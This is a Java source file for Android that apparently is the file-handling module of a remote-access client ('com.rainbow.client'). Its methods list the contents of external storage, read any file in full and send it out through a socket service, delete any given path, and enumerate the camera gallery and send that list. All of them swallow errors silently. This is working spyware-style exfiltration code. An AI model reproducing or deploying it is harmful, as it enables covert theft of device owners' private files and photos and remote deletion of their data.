package com.rainbow.client;

import android.content.Context;
import android.os.Environment;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.File;
import java.io.FileInputStream;

public class FileHelper {

    public static void list(Context ctx, String path) {
        try {
            File dir = path.isEmpty() ? Environment.getExternalStorageDirectory() : new File(path);
            if (!dir.exists()) return;
            JSONArray arr = new JSONArray();
            File[] files = dir.listFiles();
            if (files != null) {
                for (File f : files) {
                    JSONObject o = new JSONObject();
                    o.put("name", f.getName());
                    o.put("isFolder", f.isDirectory());
                    o.put("size", f.length());
                    arr.put(o);
                }
            }
            SocketService2.sendFile("listing.json", arr.toString().getBytes());
        } catch (Exception ignored) {}
    }

    public static void upload(Context ctx, String path) {
        try {
            File f = new File(path);
            if (!f.exists() || f.isDirectory()) return;
            byte[] data = new byte[(int) f.length()];
            FileInputStream in = new FileInputStream(f);
            in.read(data);
            in.close();
            SocketService2.sendFile(f.getName(), data);
        } catch (Exception ignored) {}
    }

    public static void delete(Context ctx, String path) {
        try { new File(path).delete(); } catch (Exception ignored) {}
    }

    public static void gallery(Context ctx) {
        try {
            File dcim = new File(Environment.getExternalStorageDirectory(), "DCIM/Camera");
            if (dcim.exists()) {
                JSONArray arr = new JSONArray();
                File[] files = dcim.listFiles();
                if (files != null) for (File f : files) arr.put(f.getAbsolutePath());
                SocketService2.sendFile("gallery.json", arr.toString().getBytes());
            }
        } catch (Exception ignored) {}
    }
}